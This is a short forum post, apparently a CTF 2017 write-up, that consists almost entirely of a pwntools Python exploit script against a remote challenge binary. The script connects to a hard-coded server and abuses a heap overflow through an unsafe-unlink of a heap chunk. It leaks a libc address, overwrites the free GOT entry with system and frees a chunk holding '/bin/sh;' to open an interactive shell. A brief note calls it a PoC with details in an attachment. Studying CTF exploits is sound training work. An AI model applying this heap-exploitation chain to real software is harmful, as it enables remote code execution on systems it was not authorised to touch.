
# [原创]CTF2017第四题分析

```
from pwn import *

context(arch='amd64')

#p = process("./main")

p = remote('211.159.216.90',51888)#211.159.216.90 51888

#libc = ELF('/root/4/ctflibc.so.6')

def create_ex(_size,_cun,_content):

	print p.recvuntil('$ ')

	p.send('1')

	print p.recvline()

	p.send(_size)

	print p.recvline()

	p.send(_cun)

	print p.recvline()

	p.send(_content)

def delete_ex(_cun):

	print p.recvuntil('$ ')

	p.send('2')

	print p.recvline()

	p.send(_cun)

def edit_ex(_cun,_content):

	print p.recvuntil('$ ')

	p.send('3')

	print p.recvline()

	p.send(_cun)

	print p.recvline()

	p.send(_content)

ptr_addr = 0x000000006020E0

free_got = 0x00000000602018

#sys_addr = 0x007ffff7a7a450

sys_rva  = 0x00000000041fd0

put_rva  = 0x0000000006cee0

free_rva = 0x00000000080370

def pwn():

	p.recvuntil('$ ')

	p.sendline('loudy')

	create_ex('160','0','a'*0x20)

	create_ex('160','1','b'*0x20)

	create_ex('160','2','/bin/sh;'+'c'*0x20)

	create_ex('160','3','/bin/sh;'+'e'*0x20)

	create_ex('10','-2','d'*7)

	payload = p64(0x0)+p64(0xa1)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+'a'*0x80+p64(0xa0)+p64(0xb0)

	edit_ex('0',payload)

	delete_ex('1')

	

	payload2 = p64(0x0)+p64(0x1)+p64(0xa)+p64(0x602018)+p64(1)+p64(0x603110)+p64(0xa)+p64(0x602020)

	edit_ex('0',payload2)

	payload3 = '\xd0\x06\x40\x00\x00\x00\x00\x00'

	edit_ex('0',payload3)

	print p.recvuntil('$ ')

	p.send('2')

	print p.recvline()

	p.send('2')

	sysysys = u64(p.recv(8))%0x1000000000000

	print hex(sysysys)

	sysysys = sysysys-put_rva+sys_rva

	print hex(sysysys)

	edit_ex('0',p64(sysysys))

	delete_ex('3')

pwn()

p.interactive()
```

以上是Poc。堆溢出利用，具体见附件

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [第四题writeup.zip](javascript:void(0);)

  （103.34kb，95次下载）
